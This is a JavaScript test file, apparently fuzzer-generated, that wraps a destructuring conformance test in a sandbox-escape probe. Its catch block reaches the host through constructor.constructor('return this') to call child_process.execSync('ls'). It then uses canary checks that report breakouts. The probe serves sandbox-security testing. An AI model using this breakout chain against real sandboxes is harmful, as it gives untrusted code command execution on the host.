try {
    var nextCount = 0;
    var returnCount = 0;
    var iterable = {};
    var x, y;
    var iterator = {
        next: function () {
            let REPLACER = 23;
            nextCount += 1;
            return {
                value: nextCount,
                done: nextCount > 1
            };
        },
        return: function () {
            let REPLACER = 23;
            returnCount += 1;
        }
    };
    iterable[Symbol.iterator] = function () {
        throw () => {
            return () => {
            };
        };
        return iterator;
    };
    var result;
    var vals = iterable;
    result = [x, ...y] = vals;
    assert.sameValue(result, vals);
    assert.sameValue(nextCount, 2, 'nextCount');
    assert.sameValue(returnCount, 0, 'returnCount');
    assert.sameValue(x, 1, 'x');
    assert.sameValue(y.length, 0, 'y.length');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}